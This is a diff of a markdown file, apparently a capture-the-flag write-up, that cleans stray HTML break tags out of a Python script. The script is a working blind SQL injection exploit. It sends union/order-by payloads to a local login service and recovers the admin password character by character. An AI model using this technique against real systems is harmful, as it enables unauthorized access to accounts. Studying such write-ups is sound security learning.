@@ -105,43 +105,25 @@ After a bunch of different payloads we figure that this is vulernable to Blind S
 ``python
 #!/usr/bin/python
 import requests
-def string(start,end):\
-<br>
-</br>
+def string(start,end):
         str=''
         for i in range(start,end):
-    \
-    <br>
-    </br>
                 str+=chr(i)
         return str
-def passwd():\
-<br>
-</br>
+def passwd():
         url='http://127.0.0.1:10003/?username='
         test=string(48,127)
         username="admin' union distinct select 1,2,0x{hex} order by 3 desc%23&password=1"
         flag=""
         for _ in range(32):
-    \
-    <br>
-    </br>
                 for i in test:
-            \
-            <br>
-            </br>
                         data = username.format(hex=(flag+i).encode('hex'))
                         result=requests.post(url+data)
                         if "admin" not in result.text:
-                    \
-                    <br>
-                    </br>
                                 flag=flag+chr(ord(i)-1)
                                 print flag
                                 break
-if __name__ == '__main__':\
-<br>
-</br>
+if __name__ == '__main__':
         passwd()
 ``
 And we run it:\
